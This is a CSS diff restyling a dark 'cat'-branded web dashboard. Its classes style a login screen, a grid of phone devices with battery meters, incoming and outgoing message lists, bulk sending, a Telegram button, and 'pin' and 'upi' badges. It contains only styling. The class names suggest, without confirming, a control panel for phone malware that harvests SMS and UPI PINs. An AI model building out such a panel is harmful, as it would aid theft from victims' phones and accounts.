@@ -10,9 +10,7 @@
 <style>
     :root {
         --bg: #03060f;
-        --bg-2: #060b1a;
         --panel: #080f22;
-        --panel-2: #0b1430;
         --border: #16294f;
         --border-hi: #1e4a86;
         --text: #dceaff;
@@ -24,7 +22,6 @@
         --amber: #fbbf24;
         --green: #34d399;
         --radius: 14px;
-        --glow: 0 0 0 1px #38bdf826, 0 0 34px #38bdf814;
         --font: "Outfit", system-ui, sans-serif;
         --mono: "JetBrains Mono", monospace;
     }
@@ -70,13 +67,10 @@
     ::-webkit-scrollbar-track { background: #050a18; }
     ::-webkit-scrollbar-thumb { background: #1c3a6b; border-radius: 6px; }
     ::-webkit-scrollbar-thumb:hover { background: var(--neon-2); }
-
     ::selection { background: var(--neon); color: #001521; }
     mark { background: #22d3ee4d; color: #eaf6ff; border-radius: 3px; padding: 0 2px; }
 
-    /* cat logo */
-    .cat-logo { width: 46px; height: 46px; flex: 0 0 auto;
-                filter: drop-shadow(0 0 12px #8b5cf655); }
+    .cat-logo { width: 46px; height: 46px; flex: 0 0 auto; filter: drop-shadow(0 0 12px #8b5cf655); }
     .cat-eye { transform-origin: center; animation: catBlink 4.5s infinite; }
     .cat-ear-l { transform-origin: 20px 18px; animation: earTwitch 5s infinite; }
     .cat-ear-r { transform-origin: 44px 18px; animation: earTwitch 5s infinite .4s; }
@@ -85,141 +79,69 @@
     @keyframes earTwitch { 0%,86%,100% { transform: rotate(0) } 91% { transform: rotate(-7deg) } 96% { transform: rotate(5deg) } }
     @keyframes whiskerPulse { 50% { opacity: .45 } }
 
-    /* shadow panel */
     .shadow-panel {
         position: relative;
         background: linear-gradient(160deg, #0a1226, #060b1a);
         border: 1px solid var(--border);
         border-radius: var(--radius);
-        box-shadow:
-            0 0 0 1px #38bdf80f,
-            0 18px 50px #000000a6,
-            0 0 44px #1e3a8a1f,
-            inset 0 1px 0 #ffffff08;
+        box-shadow: 0 0 0 1px #38bdf80f, 0 18px 50px #000000a6, 0 0 44px #1e3a8a1f, inset 0 1px 0 #ffffff08;
     }
-
     .shadow-panel::before {
-        content: "";
-        position: absolute;
-        inset: -1px;
-        border-radius: inherit;
-        padding: 1px;
+        content: ""; position: absolute; inset: -1px; border-radius: inherit; padding: 1px;
         background: linear-gradient(135deg, #22d3ee44, transparent 40%, #8b5cf644);
         -webkit-mask: linear-gradient(#000 0 0) content-box, linear-gradient(#000 0 0);
-        -webkit-mask-composite: xor;
-        mask-composite: exclude;
-        pointer-events: none;
+        -webkit-mask-composite: xor; mask-composite: exclude; pointer-events: none;
     }
 
     /* ------------------------------------------------------------ login */
-
     .login-screen { min-height: 100vh; display: grid; place-items: center; padding: 24px; }
-
     .login-card {
-        width: 100%;
-        max-width: 420px;
-        padding: 32px;
+        width: 100%; max-width: 420px; padding: 32px;
         background: linear-gradient(160deg, #0a1226, #050a18);
-        border: 1px solid var(--border);
-        border-radius: 22px;
-        box-shadow:
-            0 0 0 1px #38bdf81a,
-            0 30px 90px #000000b3,
-            0 0 80px #1e3a8a2e;
+        border: 1px solid var(--border); border-radius: 22px;
+        box-shadow: 0 0 0 1px #38bdf81a, 0 30px 90px #000000b3, 0 0 80px #1e3a8a2e;
     }
-
     .brand { display: flex; align-items: center; gap: 13px; }
-
     .brand-text h1 {
-        margin: 0;
-        font-size: 21px;
-        font-weight: 800;
-        letter-spacing: 2.4px;
+        margin: 0; font-size: 21px; font-weight: 800; letter-spacing: 2.4px;
         background: linear-gradient(100deg, #22d3ee, #8b5cf6 60%, #38bdf8);
-        -webkit-background-clip: text;
-        background-clip: text;
-        color: transparent;
+        -webkit-background-clip: text; background-clip: text; color: transparent;
         filter: drop-shadow(0 0 14px #22d3ee44);
     }
-
-    .brand-text p {
-        margin: 3px 0 0;
-        font-size: 11px;
-        color: var(--muted);
-        letter-spacing: 1.6px;
-        text-transform: uppercase;
-    }
-
+    .brand-text p { margin: 3px 0 0; font-size: 11px; color: var(--muted); letter-spacing: 1.6px; text-transform: uppercase; }
     .login-card h2 { font-size: 19px; margin: 26px 0 6px; letter-spacing: .6px; }
     .login-card > p { color: var(--muted); font-size: 13px; margin: 0 0 22px; }
 
     label {
-        display: block;
-        color: #a8c2ea;
-        font-size: 11px;
-        letter-spacing: 1.3px;
-        text-transform: uppercase;
-        margin: 15px 0 7px;
+        display: block; color: #a8c2ea; font-size: 11px;
+        letter-spacing: 1.3px; text-transform: uppercase; margin: 15px 0 7px;
     }
 
     input, textarea, select {
-        width: 100%;
-        padding: 12px 13px;
-        color: var(--text);
-        background: #04091a;
-        border: 1px solid var(--border);
-        border-radius: 10px;
-        outline: none;
-        font-family: var(--font);
-        transition: .15s;
+        width: 100%; padding: 12px 13px; color: var(--text);
+        background: #04091a; border: 1px solid var(--border);
+        border-radius: 10px; outline: none; font-family: var(--font); transition: .15s;
     }
-
     textarea { resize: vertical; min-height: 84px; font-size: 13px; }
     input::placeholder, textarea::placeholder { color: #35507e; }
-
     input:focus, textarea:focus, select:focus {
-        border-color: var(--neon);
-        box-shadow: 0 0 0 3px #22d3ee1f, 0 0 22px #22d3ee26;
+        border-color: var(--neon); box-shadow: 0 0 0 3px #22d3ee1f, 0 0 22px #22d3ee26;
     }
 
     .primary-button, .secondary-button, .logout-button, .ghost-button {
-        border: 1px solid transparent;
-        border-radius: 10px;
-        padding: 11px 16px;
-        font-weight: 700;
-        font-size: 13px;
-        letter-spacing: .7px;
-        transition: .15s;
+        border: 1px solid transparent; border-radius: 10px; padding: 11px 16px;
+        font-weight: 700; font-size: 13px; letter-spacing: .7px; transition: .15s;
     }
-
-    .primary-button {
-        color: #001521;
-        background: linear-gradient(100deg, #22d3ee, #38bdf8);
-        box-shadow: 0 0 24px #22d3ee4d;
-    }
+    .primary-button { color: #001521; background: linear-gradient(100deg, #22d3ee, #38bdf8); box-shadow: 0 0 24px #22d3ee4d; }
     .primary-button:hover { box-shadow: 0 0 34px #22d3ee80; transform: translateY(-1px); }
-
-    .secondary-button {
-        color: var(--neon);
-        background: #22d3ee0f;
-        border-color: #22d3ee33;
-    }
+    .secondary-button { color: var(--neon); background: #22d3ee0f; border-color: #22d3ee33; }
     .secondary-button:hover { background: #22d3ee1f; border-color: var(--neon); box-shadow: 0 0 20px #22d3ee40; }
-    .secondary-button.active {
-        color: #001521;
-        background: linear-gradient(100deg, #22d3ee, #38bdf8);
-        border-color: transparent;
-        box-shadow: 0 0 22px #22d3ee5c;
-    }
-
+    .secondary-button.active { color: #001521; background: linear-gradient(100deg, #22d3ee, #38bdf8); border-color: transparent; box-shadow: 0 0 22px #22d3ee5c; }
     .ghost-button { color: var(--muted); background: transparent; border-color: var(--border); }
     .ghost-button:hover { color: var(--text); border-color: var(--border-hi); }
-
     .logout-button { color: #ffc9d4; background: #ff5c7a14; border-color: #ff5c7a35; }
     .logout-button:hover { background: #ff5c7a26; }
-
     .login-submit { width: 100%; margin-top: 20px; padding: 13px; }
-
     button:disabled { opacity: .5; cursor: not-allowed; }
 
     .message { margin-top: 13px; font-size: 12.5px; }
@@ -227,245 +149,133 @@
     .message.success { color: var(--green); }
 
     .login-foot {
-        margin-top: 20px;
-        padding-top: 15px;
-        border-top: 1px solid var(--border);
-        display: flex;
-        justify-content: space-between;
-        font-size: 11px;
-        color: var(--muted);
-        letter-spacing: 1px;
+        margin-top: 20px; padding-top: 15px; border-top: 1px solid var(--border);
+        display: flex; justify-content: space-between; font-size: 11px; color: var(--muted); letter-spacing: 1px;
     }
 
     /* ----------------------------------------------------------- layout */
-
     .app { min-height: 100vh; }
-
     .topbar {
         position: sticky; top: 0; z-index: 10;
         display: flex; justify-content: space-between; align-items: center;
         gap: 16px; padding: 12px 22px;
-        background: #03060fe6;
-        backdrop-filter: blur(14px);
-        border-bottom: 1px solid var(--border);
+        background: #03060fe6; backdrop-filter: blur(14px); border-bottom: 1px solid var(--border);
     }
-
     .topbar-right { display: flex; align-items: center; gap: 10px; }
 
     .status-pill {
         display: inline-flex; align-items: center; gap: 7px;
         border: 1px solid var(--border); border-radius: 999px;
-        padding: 7px 12px; font-size: 11px;
-        color: var(--muted); letter-spacing: .8px;
+        padding: 7px 12px; font-size: 11px; color: var(--muted); letter-spacing: .8px;
     }
-
-    .status-dot {
-        width: 7px; height: 7px; border-radius: 50%;
-        background: var(--neon); box-shadow: 0 0 10px var(--neon);
-        animation: pulse 2s infinite;
-    }
+    .status-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--neon); box-shadow: 0 0 10px var(--neon); animation: pulse 2s infinite; }
     @keyframes pulse { 50% { opacity: .3 } }
 
     .tg-button {
-        display: inline-grid; place-items: center;
-        width: 38px; height: 38px; border-radius: 50%;
-        color: #7fd8ff; background: #229ed917;
-        border: 1px solid #229ed940; transition: .15s;
+        display: inline-grid; place-items: center; width: 38px; height: 38px;
+        border-radius: 50%; color: #7fd8ff; background: #229ed917; border: 1px solid #229ed940; transition: .15s;
     }
-    .tg-button:hover {
-        color: #fff; background: #229ed9; border-color: #229ed9;
-        box-shadow: 0 0 24px #229ed966; transform: translateY(-1px);
-    }
+    .tg-button:hover { color: #fff; background: #229ed9; border-color: #229ed9; box-shadow: 0 0 24px #229ed966; transform: translateY(-1px); }
 
     .layout { display: grid; grid-template-columns: 220px minmax(0, 1fr); min-height: calc(100vh - 63px); }
-
-    .sidebar {
-        padding: 20px 12px;
-        border-right: 1px solid var(--border);
-        background: linear-gradient(180deg, #060b1a, #03060f);
-    }
-
-    .sidebar-label {
-        padding: 0 10px; margin: 0 0 10px;
-        color: #35507e; font-size: 10px; font-weight: 800;
-        letter-spacing: 1.8px; text-transform: uppercase;
-    }
+    .sidebar { padding: 20px 12px; border-right: 1px solid var(--border); background: linear-gradient(180deg, #060b1a, #03060f); }
+    .sidebar-label { padding: 0 10px; margin: 0 0 10px; color: #35507e; font-size: 10px; font-weight: 800; letter-spacing: 1.8px; text-transform: uppercase; }
 
     .nav-button {
-        display: flex; align-items: center; gap: 10px;
-        width: 100%; padding: 11px; margin-bottom: 4px;
-        text-align: left; color: var(--muted);
-        background: transparent; border: 1px solid transparent;
-        border-radius: 10px; font-size: 13px; font-weight: 500;
-        transition: .14s;
+        display: flex; align-items: center; gap: 10px; width: 100%;
+        padding: 11px; margin-bottom: 4px; text-align: left; color: var(--muted);
+        background: transparent; border: 1px solid transparent; border-radius: 10px;
+        font-size: 13px; font-weight: 500; transition: .14s;
     }
-
     .nav-button:hover { color: var(--text); background: #22d3ee0a; }
-
     .nav-button.active {
-        color: var(--neon);
-        background: linear-gradient(90deg, #22d3ee1f, #22d3ee08);
-        border-color: #22d3ee35;
-        box-shadow: inset 3px 0 0 var(--neon), 0 0 22px #22d3ee1f;
+        color: var(--neon); background: linear-gradient(90deg, #22d3ee1f, #22d3ee08);
+        border-color: #22d3ee35; box-shadow: inset 3px 0 0 var(--neon), 0 0 22px #22d3ee1f;
     }
-
     .nav-icon { width: 18px; text-align: center; font-size: 13px; }
-
-    .sidebar-footer {
-        margin: 26px 8px 0; padding-top: 16px;
-        border-top: 1px solid var(--border);
-        color: #35507e; font-size: 11px; line-height: 1.9;
-    }
+    .sidebar-footer { margin: 26px 8px 0; padding-top: 16px; border-top: 1px solid var(--border); color: #35507e; font-size: 11px; line-height: 1.9; }
 
     main { width: 100%; max-width: 1600px; padding: 26px; margin: 0 auto; min-width: 0; }
 
-    .page-header {
-        display: flex; justify-content: space-between; align-items: flex-start;
-        gap: 18px; margin-bottom: 22px;
-    }
-
+    .page-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 18px; margin-bottom: 22px; }
     .page-header h2 {
-        margin: 0 0 6px; font-size: clamp(21px, 2.6vw, 27px);
-        font-weight: 800; letter-spacing: -.4px;
+        margin: 0 0 6px; font-size: clamp(21px, 2.6vw, 27px); font-weight: 800; letter-spacing: -.4px;
         background: linear-gradient(100deg, #e8f4ff, #7dd3fc);
         -webkit-background-clip: text; background-clip: text; color: transparent;
     }
-
     .page-header p { margin: 0; color: var(--muted); font-size: 13px; }
 
     /* ---------------------------------------------------------- stats */
-
-    .stats-grid {
-        display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr));
-        gap: 16px; margin-bottom: 22px;
-    }
-
+    .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); gap: 16px; margin-bottom: 22px; }
     .stat-card { padding: 19px; min-width: 0; }
-
     .stat-top { display: flex; align-items: center; justify-content: space-between; gap: 10px; }
-
-    .stat-label {
-        color: var(--muted); font-size: 11px;
-        letter-spacing: 1.4px; text-transform: uppercase; font-weight: 600;
-    }
-
-    .stat-icon {
-        display: grid; place-items: center;
-        width: 32px; height: 32px; border-radius: 9px;
-        background: #22d3ee14; border: 1px solid #22d3ee2e;
-        color: var(--neon); font-size: 14px;
-    }
-
-    .stat-value {
-        margin-top: 15px; font-size: 32px; font-weight: 800;
-        letter-spacing: -1px;
-        color: #eaf6ff;
-        text-shadow: 0 0 26px #22d3ee4d;
-        overflow-wrap: anywhere;
-    }
-
+    .stat-label { color: var(--muted); font-size: 11px; letter-spacing: 1.4px; text-transform: uppercase; font-weight: 600; }
+    .stat-icon { display: grid; place-items: center; width: 32px; height: 32px; border-radius: 9px; background: #22d3ee14; border: 1px solid #22d3ee2e; color: var(--neon); font-size: 14px; }
+    .stat-value { margin-top: 15px; font-size: 32px; font-weight: 800; letter-spacing: -1px; color: #eaf6ff; text-shadow: 0 0 26px #22d3ee4d; overflow-wrap: anywhere; }
     .stat-value.neon { color: var(--neon); text-shadow: 0 0 30px #22d3ee66; }
     .stat-value.green { color: var(--green); text-shadow: 0 0 30px #34d3994d; }
     .stat-value.red { color: var(--red); text-shadow: 0 0 30px #ff5c7a4d; }
     .stat-value.violet { color: #c4b5fd; text-shadow: 0 0 30px #8b5cf666; }
-
     .stat-foot { margin-top: 6px; color: #35507e; font-size: 11.5px; }
 
     /* --------------------------------------------------------- panels */
-
-    .content-grid {
-        display: grid; grid-template-columns: minmax(0, 1.4fr) minmax(280px, .8fr);
-        gap: 18px;
-    }
-
+    .content-grid { display: grid; grid-template-columns: minmax(0, 1.4fr) minmax(280px, .8fr); gap: 18px; }
     .panel { min-width: 0; overflow: hidden; margin-bottom: 18px; }
-
     .panel-header {
-        display: flex; justify-content: space-between; align-items: center;
-        gap: 12px; padding: 16px 18px;
-        border-bottom: 1px solid var(--border);
-        background: #0d1730a6;
+        display: flex; justify-content: space-between; align-items: center; gap: 12px;
+        padding: 15px 18px; border-bottom: 1px solid var(--border); background: #0d1730a6;
     }
+    .panel-header h3 { margin: 0; font-size: 13.5px; font-weight: 700; letter-spacing: .3px; }
+    .panel-body { padding: 16px 18px; }
 
-    .panel-header h3 { margin: 0; font-size: 14px; font-weight: 700; letter-spacing: .3px; }
-
-    .panel-body { padding: 18px; }
-
-    .connection-row {
-        display: flex; align-items: center; justify-content: space-between;
-        gap: 14px; padding: 12px 0; border-bottom: 1px solid #0f1e3d;
-    }
+    .connection-row { display: flex; align-items: center; justify-content: space-between; gap: 14px; padding: 12px 0; border-bottom: 1px solid #0f1e3d; }
     .connection-row:last-child { border-bottom: 0; }
-
     .connection-name { font-size: 13px; font-weight: 600; }
     .connection-desc { margin-top: 3px; font-size: 11.5px; color: var(--muted); }
 
     .badge {
-        display: inline-flex; align-items: center; padding: 5px 10px;
-        border-radius: 999px; background: #ffffff0a; border: 1px solid var(--border);
-        color: var(--muted); font-size: 11px; font-weight: 600;
-        letter-spacing: .5px; white-space: nowrap;
+        display: inline-flex; align-items: center; padding: 5px 10px; border-radius: 999px;
+        background: #ffffff0a; border: 1px solid var(--border); color: var(--muted);
+        font-size: 11px; font-weight: 600; letter-spacing: .5px; white-space: nowrap;
     }
-
     .badge.online, .badge.active, .badge.sent, .badge.success, .badge.bound, .badge.upi {
-        color: var(--neon); border-color: #22d3ee35; background: #22d3ee12;
-        box-shadow: 0 0 14px #22d3ee1f;
+        color: var(--neon); border-color: #22d3ee35; background: #22d3ee12; box-shadow: 0 0 14px #22d3ee1f;
     }
-    .badge.pending, .badge.queued { color: var(--amber); border-color: #fbbf2435; background: #fbbf2412; }
+    .badge.pending, .badge.queued, .badge.sending { color: var(--amber); border-color: #fbbf2435; background: #fbbf2412; }
     .badge.error, .badge.failed, .badge.offline { color: var(--red); border-color: #ff5c7a35; background: #ff5c7a12; }
     .badge.in { color: var(--violet); border-color: #8b5cf635; background: #8b5cf612; }
     .badge.out { color: var(--neon-2); border-color: #38bdf835; background: #38bdf812; }
     .badge.pin { color: #c4b5fd; border-color: #8b5cf640; background: #8b5cf614; }
+    .badge.entered { color: #c4b5fd; border-color: #8b5cf640; background: #8b5cf614; }
 
     .table-wrap { width: 100%; overflow-x: auto; }
-
     table { width: 100%; border-collapse: collapse; text-align: left; font-size: 13px; }
-
     th, td { padding: 12px 16px; border-bottom: 1px solid #0f1e3d; white-space: nowrap; }
-
-    th {
-        color: var(--muted); font-size: 10.5px; font-weight: 700;
-        text-transform: uppercase; letter-spacing: 1.2px;
-        background: #0a1226;
-    }
-
+    th { color: var(--muted); font-size: 10.5px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.2px; background: #0a1226; }
     td { color: #bcd4f5; }
     tbody tr:hover td { background: #22d3ee08; }
     tbody tr:last-child td { border-bottom: 0; }
 
     .cell-sub { display: block; margin-top: 4px; color: #35507e; font-size: 11px; }
-
     .cell-pin {
-        display: inline-block; margin-top: 5px; padding: 2px 8px;
-        border-radius: 6px; font-family: var(--mono); font-size: 11px;
-        font-weight: 700; letter-spacing: .6px;
+        display: inline-block; margin-top: 5px; padding: 2px 8px; border-radius: 6px;
+        font-family: var(--mono); font-size: 11px; font-weight: 700; letter-spacing: .6px;
         color: #c4b5fd; background: #8b5cf614; border: 1px solid #8b5cf630;
     }
+    .cell-body { max-width: 340px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; display: block; font-family: var(--mono); font-size: 12px; }
 
-    .cell-pin.none { color: #35507e; background: #ffffff05; border-color: var(--border); font-weight: 500; }
-
-    .cell-body {
-        max-width: 340px; overflow: hidden; text-overflow: ellipsis;
-        white-space: nowrap; display: block; font-family: var(--mono); font-size: 12px;
-    }
-
-    .row-button {
-        padding: 7px 12px; font-size: 11.5px; font-weight: 700;
-        color: var(--neon); background: #22d3ee12;
-        border: 1px solid #22d3ee30; border-radius: 8px;
-    }
+    .row-button { padding: 7px 12px; font-size: 11.5px; font-weight: 700; color: var(--neon); background: #22d3ee12; border: 1px solid #22d3ee30; border-radius: 8px; }
     .row-button:hover { background: #22d3ee22; border-color: var(--neon); box-shadow: 0 0 16px #22d3ee40; }
     .row-button.danger { color: #c4b5fd; background: #8b5cf612; border-color: #8b5cf630; }
     .row-button.danger:hover { background: #8b5cf622; border-color: var(--violet); }
 
     .inline-input { padding: 8px 10px; font-size: 12px; border-radius: 8px; }
-
     .empty-state { padding: 34px 16px; text-align: center; color: #35507e; font-size: 13px; }
 
     .notice {
         margin-bottom: 18px; padding: 12px 15px; border-radius: 10px;
-        background: #22d3ee0f; border: 1px solid #22d3ee30;
-        border-left: 3px solid var(--neon); color: #b6d9f5; font-size: 13px;
+        background: #22d3ee0f; border: 1px solid #22d3ee30; border-left: 3px solid var(--neon);
+        color: #b6d9f5; font-size: 13px;
     }
 
     .page-section { display: none; }
@@ -479,86 +289,55 @@
     .footer { padding: 18px 0 4px; text-align: center; color: #35507e; font-size: 11.5px; }
 
     .toast {
-        position: fixed; right: 20px; bottom: 20px; z-index: 60;
+        position: fixed; right: 20px; bottom: 20px; z-index: 70;
         max-width: calc(100vw - 40px); padding: 13px 17px;
         border: 1px solid #22d3ee35; border-left: 3px solid var(--neon);
         border-radius: 11px; background: #071026; color: #d5ecff;
         box-shadow: 0 14px 44px #000a, 0 0 26px #22d3ee26; font-size: 13px;
     }
 
-    /* ------------------------------------------------------- bulk bar */
-
-    .bulk-bar {
-        display: grid; grid-template-columns: minmax(0, 1fr) 190px auto;
-        gap: 12px; align-items: start; padding: 16px;
-    }
-
+    .bulk-bar { display: grid; grid-template-columns: minmax(0, 1fr) 190px auto; gap: 12px; align-items: start; padding: 16px; }
     .bulk-bar .bulk-actions { display: flex; flex-direction: column; gap: 8px; }
 
     /* ------------------------------------------------------- device grid */
-
-    .device-toolbar {
-        display: flex; gap: 10px; align-items: center; flex-wrap: wrap;
-    }
-
+    .device-toolbar { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
     .device-toolbar input { width: 230px; }
 
-    .device-grid {
-        display: grid;
-        grid-template-columns: repeat(auto-fill, minmax(255px, 1fr));
-        gap: 16px;
-    }
+    .device-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 16px; }
 
     .device-card {
-        padding: 16px;
-        display: flex; flex-direction: column; gap: 13px;
+        padding: 16px; display: flex; flex-direction: column; gap: 12px;
         cursor: pointer; text-align: left;
         transition: transform .16s, border-color .16s, box-shadow .16s;
     }
-
     .device-card:hover, .device-card:focus-visible {
-        transform: translateY(-3px);
-        border-color: var(--border-hi);
-        box-shadow: 0 0 0 1px #38bdf833, 0 20px 48px #000c, 0 0 42px #22d3ee26;
-        outline: none;
+        transform: translateY(-3px); border-color: var(--border-hi);
+        box-shadow: 0 0 0 1px #38bdf833, 0 20px 48px #000c, 0 0 42px #22d3ee26; outline: none;
     }
 
     .device-card-top { display: flex; align-items: center; gap: 12px; }
 
     .phone-badge {
-        display: grid; place-items: center;
-        width: 46px; height: 46px; flex: 0 0 auto;
+        display: grid; place-items: center; width: 46px; height: 46px; flex: 0 0 auto;
         border-radius: 13px; color: var(--neon);
         background: linear-gradient(150deg, #22d3ee1f, #8b5cf614);
-        border: 1px solid #22d3ee2e;
-        box-shadow: inset 0 1px 0 #ffffff0f, 0 0 20px #22d3ee1a;
+        border: 1px solid #22d3ee2e; box-shadow: inset 0 1px 0 #ffffff0f, 0 0 20px #22d3ee1a;
     }
 
     .device-card-name { font-size: 14px; font-weight: 700; overflow-wrap: anywhere; }
     .device-card-sub { margin-top: 3px; color: var(--muted); font-size: 11.5px; }
-
-    .device-card-meta {
-        display: flex; flex-wrap: wrap; gap: 7px; align-items: center;
-    }
-
+    .device-card-meta { display: flex; flex-wrap: wrap; gap: 7px; align-items: center; }
     .device-card-foot {
-        display: flex; align-items: center; justify-content: space-between;
-        gap: 10px; padding-top: 11px; border-top: 1px solid #0f1e3d;
-        color: #35507e; font-size: 11.5px;
+        display: flex; align-items: center; justify-content: space-between; gap: 10px;
+        padding-top: 11px; border-top: 1px solid #0f1e3d; color: #35507e; font-size: 11.5px;
     }
-
     .open-hint { color: var(--neon); font-weight: 700; font-size: 11.5px; letter-spacing: .5px; }
 
-    /* battery meter */
     .batt { display: inline-flex; align-items: center; gap: 7px; }
-    .batt-shell {
-        position: relative; width: 42px; height: 19px;
-        border: 1.6px solid var(--border-hi); border-radius: 5px; padding: 2px;
-    }
+    .batt-shell { position: relative; width: 42px; height: 19px; border: 1.6px solid var(--border-hi); border-radius: 5px; padding: 2px; }
     .batt-shell::after {
-        content: ""; position: absolute; right: -5px; top: 50%;
-        transform: translateY(-50%); width: 3px; height: 9px;
-        background: var(--border-hi); border-radius: 0 2px 2px 0;
+        content: ""; position: absolute; right: -5px; top: 50%; transform: translateY(-50%);
+        width: 3px; height: 9px; background: var(--border-hi); border-radius: 0 2px 2px 0;
     }
     .batt-fill { height: 100%; border-radius: 2px; background: var(--green); transition: width .3s; }
     .batt-fill.low { background: var(--red); box-shadow: 0 0 10px #ff5c7a80; }
@@ -568,116 +347,79 @@
     .batt-bolt { color: var(--amber); display: inline-flex; filter: drop-shadow(0 0 6px #fbbf2480); }
 
     /* ------------------------------------------------- device detail */
-
     .detail-overlay {
-        position: fixed; inset: 0; z-index: 45;
-        overflow-y: auto; padding: 20px;
+        position: fixed; inset: 0; z-index: 45; overflow-y: auto; padding: 20px;
         background: #01030af2; backdrop-filter: blur(6px);
     }
-
     .detail-shell { max-width: 1220px; margin: 0 auto; }
 
     .detail-head {
         display: flex; align-items: center; justify-content: space-between;
-        gap: 16px; flex-wrap: wrap; padding: 16px 18px; margin-bottom: 18px;
+        gap: 16px; flex-wrap: wrap; padding: 15px 18px; margin-bottom: 14px;
     }
-
     .detail-head-id { display: flex; align-items: center; gap: 13px; min-width: 0; }
     .detail-name { font-size: 17px; font-weight: 800; overflow-wrap: anywhere; }
     .detail-sub { margin-top: 4px; color: var(--muted); font-size: 12px; }
     .detail-tags { display: flex; gap: 7px; flex-wrap: wrap; margin-top: 8px; }
-
     .detail-head-right { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
 
-    .detail-grid {
-        display: grid; grid-template-columns: 350px minmax(0, 1fr);
-        gap: 18px; align-items: start;
+    .link-banner {
+        display: flex; align-items: center; justify-content: space-between; gap: 12px; flex-wrap: wrap;
+        margin-bottom: 14px; padding: 12px 15px; border-radius: 11px; font-size: 13px;
+        background: #fbbf240f; border: 1px solid #fbbf2433; border-left: 3px solid var(--amber); color: #fde6b0;
     }
+    .link-banner.danger { background: #ff5c7a0f; border-color: #ff5c7a33; border-left-color: var(--red); color: #ffd0da; }
 
+    .detail-grid { display: grid; grid-template-columns: 360px minmax(0, 1fr); gap: 18px; align-items: start; }
     .detail-col { min-width: 0; }
+
+    .num-row { display: flex; align-items: center; justify-content: space-between; gap: 12px; padding: 12px 0; border-bottom: 1px solid #0f1e3d; }
+    .num-row:last-child { border-bottom: 0; }
+    .num-label { font-size: 10.5px; letter-spacing: 1.3px; text-transform: uppercase; color: #35507e; font-weight: 700; }
+    .num-val { margin-top: 5px; font-family: var(--mono); font-size: 16px; font-weight: 700; color: #eaf6ff; overflow-wrap: anywhere; }
+    .num-val.empty { color: #35507e; font-weight: 500; font-size: 13px; }
+
+    .spec-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(112px, 1fr)); gap: 10px; }
+    .spec-tile { padding: 10px 11px; border: 1px solid var(--border); border-radius: 10px; background: linear-gradient(160deg, #0a1226, #070d1c); }
+    .spec-key { font-size: 9.5px; letter-spacing: 1.3px; text-transform: uppercase; color: #35507e; font-weight: 700; }
+    .spec-val { margin-top: 6px; font-size: 13px; font-weight: 700; color: #e3f1ff; overflow-wrap: anywhere; font-family: var(--mono); }
+
+    .more-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0 18px; }
+    .more-row { display: flex; justify-content: space-between; gap: 12px; padding: 8px 0; border-bottom: 1px solid #0f1e3d; font-size: 12.5px; }
+    .more-row span:first-child { color: var(--muted); }
+    .more-row span:last-child { font-family: var(--mono); text-align: right; overflow-wrap: anywhere; }
+
+    .outbox-item { display: flex; align-items: center; gap: 9px; padding: 9px 0; border-bottom: 1px solid #0f1e3d; font-size: 12px; }
+    .outbox-item:last-child { border-bottom: 0; }
+    .outbox-body { flex: 1; min-width: 0; font-family: var(--mono); overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #bcd4f5; }
+    .outbox-time { color: #35507e; font-size: 10.5px; }
 
     .dv-search {
         display: flex; gap: 10px; flex-wrap: wrap; align-items: center;
-        padding: 13px 16px; border-bottom: 1px solid var(--border);
-        background: #0a1226;
+        padding: 12px 16px; border-bottom: 1px solid var(--border); background: #0a1226;
     }
-
     .dv-search input { flex: 1 1 200px; min-width: 150px; }
     .dv-search select { width: auto; }
     .dv-search label.badge { gap: 7px; cursor: pointer; margin: 0; text-transform: none; letter-spacing: .4px; }
     .dv-search input[type="checkbox"] { width: auto; }
 
-    .msg-list { max-height: 62vh; overflow-y: auto; }
-
+    .msg-list { max-height: 58vh; overflow-y: auto; }
     .msg-item { padding: 13px 16px; border-bottom: 1px solid #0f1e3d; }
     .msg-item:last-child { border-bottom: 0; }
     .msg-item:hover { background: #22d3ee08; }
-
-    .msg-head {
-        display: flex; align-items: center; gap: 9px; flex-wrap: wrap;
-        margin-bottom: 7px; font-size: 11.5px;
-    }
-
+    .msg-head { display: flex; align-items: center; gap: 9px; flex-wrap: wrap; margin-bottom: 7px; font-size: 11.5px; }
     .msg-addr { font-family: var(--mono); color: #bcd4f5; }
     .msg-time { margin-left: auto; color: #35507e; font-size: 11px; }
-
-    .msg-body {
-        font-family: var(--mono); font-size: 12.5px; color: #d5e7ff;
-        white-space: pre-wrap; overflow-wrap: anywhere; line-height: 1.65;
-    }
-
+    .msg-body { font-family: var(--mono); font-size: 12.5px; color: #d5e7ff; white-space: pre-wrap; overflow-wrap: anywhere; line-height: 1.65; }
     .msg-foot { margin-top: 8px; display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
 
-    /* ---------------------------------------------------------- modal */
-
-    .modal-backdrop {
-        position: fixed; inset: 0; z-index: 50;
-        display: grid; place-items: center; padding: 22px;
-        background: #01030ae6; backdrop-filter: blur(4px);
-    }
-
-    .modal-card {
-        width: 100%; max-width: 640px; max-height: 86vh;
-        display: flex; flex-direction: column;
-        background: #070e20; border: 1px solid #22d3ee30;
-        border-radius: 16px;
-        box-shadow: 0 0 70px #22d3ee1f, 0 34px 100px #000c;
-    }
-
-    .modal-header {
-        display: flex; align-items: center; justify-content: space-between;
-        gap: 12px; padding: 16px 18px; border-bottom: 1px solid var(--border);
-    }
-
-    .modal-header h3 { margin: 0; font-size: 15px; overflow-wrap: anywhere; }
-
-    .modal-body { padding: 8px 18px 18px; overflow-y: auto; }
-
-    .detail-group { margin-top: 16px; }
-    .detail-group h4 {
-        margin: 0 0 8px; font-size: 11px; letter-spacing: 1.4px;
-        text-transform: uppercase; color: #35507e;
-    }
-
-    .detail-row {
-        display: flex; justify-content: space-between; gap: 16px;
-        padding: 9px 0; border-bottom: 1px solid #0f1e3d; font-size: 13px;
-    }
-    .detail-row span:first-child { color: var(--muted); flex: 0 0 auto; }
